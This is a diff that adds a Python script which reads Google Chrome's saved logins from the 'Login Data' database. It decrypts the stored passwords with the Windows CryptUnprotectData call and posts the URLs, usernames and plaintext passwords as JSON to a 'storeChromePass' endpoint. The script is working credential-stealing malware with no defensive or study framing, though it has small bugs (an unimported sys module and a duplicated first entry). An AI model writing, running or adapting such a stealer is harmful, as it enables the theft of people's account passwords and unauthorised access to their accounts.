@@ -1,0 +1,67 @@
+import os
+import sqlite3
+import requests
+try:
+    import win32crypt
+except:
+    pass
+
+def main():
+    send()
+
+
+def getpasswords():
+    info_list = []
+    path = getpath()
+    try:
+        connection = sqlite3.connect(path + "Login Data")
+        cursor = connection.cursor()
+        v = cursor.execute(
+            'SELECT action_url, username_value, password_value FROM logins')
+        value = v.fetchall()
+
+        for origin_url, username, password in value:
+            password = win32crypt.CryptUnprotectData(
+                password, None, None, None, 0)[1]
+
+            if password:
+                info_list.append({
+                    'origin_url': origin_url,
+                    'username': username,
+                    'password': str(password)[2:-1]
+                })
+
+    except sqlite3.OperationalError as e:
+        e = str(e)
+        if (e == 'database is locked'):
+            print('[!] Make sure Google Chrome is not running in the background')
+        elif (e == 'no such table: logins'):
+            print('[!] Something wrong with the database name')
+        elif (e == 'unable to open database file'):
+            print('[!] Something wrong with the database path')
+        else:
+            print(e)
+
+    info_list.append(info_list[0])
+    return info_list
+
+def send():
+    url = "http://localhost:3000/users/storeChromePass"
+    jsonData = getpasswords()
+    print(jsonData)
+    r = requests.post(url=url, json=jsonData)
+
+
+def getpath():
+
+    PathName = os.getenv('localappdata') + \
+                   '\\Google\\Chrome\\User Data\\Default\\'
+    if not os.path.isdir(PathName):
+        print('[!] Chrome Doesn\'t exists')
+        sys.exit(0)
+
+    return PathName
+
+if __name__== '__main__':
+    main()
+
